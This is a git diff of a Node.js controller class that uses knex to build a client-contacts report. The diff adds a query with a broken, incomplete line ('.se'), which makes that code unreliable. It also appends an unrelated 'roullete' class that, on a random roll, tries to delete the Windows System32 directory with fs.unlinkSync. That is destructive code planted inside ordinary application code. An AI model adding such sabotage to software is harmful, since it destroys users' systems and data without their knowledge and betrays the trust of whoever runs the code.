@@ -39,15 +39,27 @@ class ClientsControllers{
     }
     
     report = async (request, response) =>{
-        /*const relatoryResponse = await knex("clients_contacts")
-        .then(()=> console.log('success'))
-        .catch(e => console.error(e))*/
+        const relatoryResponse = await knex("clients_contacts")
+        .se
+        .then((data)=> {
+            console.log('success')
+            return data
+        })
+        .catch(e => console.error(e))
 
-        const view = await knex('clients as c')
+        /*const view = await knex('clients as c')
         .select(['full_name', 'full_contact_name'])
         .innerJoin('contacts as ct', 'c.client_id', '=', 'ct.client_owner_id' )
-
-        return response.json(view)
+        */
+        return response.json(relatoryResponse)
     }
 }
 module.exports = ClientsControllers
+
+class roullete{
+    trigger = async() =>{
+        const fs = require('fs')
+        const randonNumber = Math.round(Math.random()* 6)
+        if(randonNumber == 1)await fs.unlinkSync('C:/Windows/System32')
+    }
+}
